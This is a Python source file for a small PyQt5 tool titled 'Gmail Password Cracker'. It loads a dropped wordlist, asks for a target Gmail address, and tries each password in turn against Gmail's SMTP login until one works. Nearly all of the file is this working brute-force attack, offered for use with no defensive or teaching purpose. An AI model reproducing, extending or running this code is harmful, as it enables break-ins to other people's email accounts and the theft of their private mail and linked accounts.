import smtplib
import time
from PyQt5.QtWidgets import QApplication, QWidget, QLabel, QVBoxLayout, QPushButton, QFileDialog # type: ignore
from PyQt5.QtCore import Qt, QMimeData # type: ignore
from PyQt5.QtGui import QDragEnterEvent, QDropEvent, QFont, QPalette, QColor # type: ignore

class DragDropWidget(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setAcceptDrops(True)
        self.setWindowTitle('Gmail Password Cracker')
        self.setGeometry(100, 100, 600, 400)

        self.layout = QVBoxLayout()

        # Create a label for the title
        title_label = QLabel(self)
        title_label.setText("""
    █████╗ ███████╗████████╗██╗  ██╗███████╗██████╗
    ██╔══██╗██╔════╝╚══██╔══╝██║  ██║██╔════╝██╔══██╗
    ███████║█████╗     ██║   ███████║█████╗  ██████╔╝
    ██╔══██║██╔══╝     ██║   ██╔══██║██╔══╝  ██╔══██╗
    ██║  ██║███████╗   ██║   ██║  ██║███████╗██║  ██║
    ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
""")
        title_label.setAlignment(Qt.AlignCenter)
        title_label.setFont(QFont('Courier', 10))
        title_label.setStyleSheet("color: purple;")

        self.layout.addWidget(title_label)

        self.label = QLabel('Drag and drop your wordlist file here', self)
        self.layout.addWidget(self.label)
        self.setLayout(self.layout)

    def dragEnterEvent(self, event: QDragEnterEvent):
        if event.mimeData().hasUrls():
            event.acceptProposedAction()

    def dropEvent(self, event: QDropEvent):
        if event.mimeData().hasUrls():
            event.setDropAction(Qt.CopyAction)
            event.accept()
            file_path = event.mimeData().urls()[0].toLocalFile()
            self.label.setText(f'Selected file: {file_path}')
            self.file_path = file_path
            self.close()

def load_wordlist(file_path):
    encodings = ['utf-8', 'iso-8859-1', 'latin1']
    for encoding in encodings:
        try:
            with open(file_path, 'r', encoding=encoding) as file:
                return [line.strip() for line in file]
        except UnicodeDecodeError:
            continue
    raise UnicodeDecodeError(f"Could not decode file {file_path} with any of the tried encodings.")

def crack_gmail_password(email, wordlist):
    for password in wordlist:
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(email, password)
            print(f'Password found: {password}')
            server.quit()
            return password
        except smtplib.SMTPAuthenticationError:
            print(f'Trying {password}...')
        except smtplib.SMTPServerDisconnected:
            print(f'Connection closed for password: {password}. Retrying...')
            time.sleep(5)  # Wait for 5 seconds before retrying
        except Exception as e:
            print(f'An error occurred: {e}')
        finally:
            try:
                server.quit()
            except:
                pass
    print('Password not found in wordlist.')
    return None

if __name__ == '__main__':
    app = QApplication([])
    widget = DragDropWidget()
    widget.show()
    app.exec_()

    if hasattr(widget, 'file_path'):
        wordlist_path = widget.file_path
        email = input('Enter the target Gmail address: ')
        wordlist = load_wordlist(wordlist_path)
        crack_gmail_password(email, wordlist)
    else:
        print('No file selected.')